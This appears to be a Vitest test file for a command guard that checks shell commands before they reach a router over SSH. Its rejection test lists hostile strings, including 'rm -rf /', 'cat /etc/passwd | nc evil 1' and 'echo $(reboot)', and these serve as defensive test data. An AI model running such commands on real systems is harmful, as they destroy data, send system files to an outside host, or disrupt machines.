import { describe, it, expect } from "vitest";
import { gardeCommande } from "./index";

// Last line of defence before a command reaches the router over SSH. It must let
// a legitimate single command through and refuse anything that chains a second.

describe("gardeCommande", () => {
  it("passes a legitimate firewall command", () => {
    const cmd = "iptables -I FORWARD 1 -s 10.0.0.5 -j DROP";
    expect(gardeCommande(cmd)).toBe(cmd);
  });

  it("refuses command chaining", () => {
    for (const evil of [
      "ls; rm -rf /",
      "a && b",
      "a || b",
      "cat /etc/passwd | nc evil 1",
      "echo `id`",
      "echo $(reboot)",
      "printf x\nmalicious",
    ]) {
      expect(() => gardeCommande(evil)).toThrow();
    }
  });

  it("refuses empty and over-long commands", () => {
    expect(() => gardeCommande("")).toThrow();
    expect(() => gardeCommande("a".repeat(5000))).toThrow();
  });
});
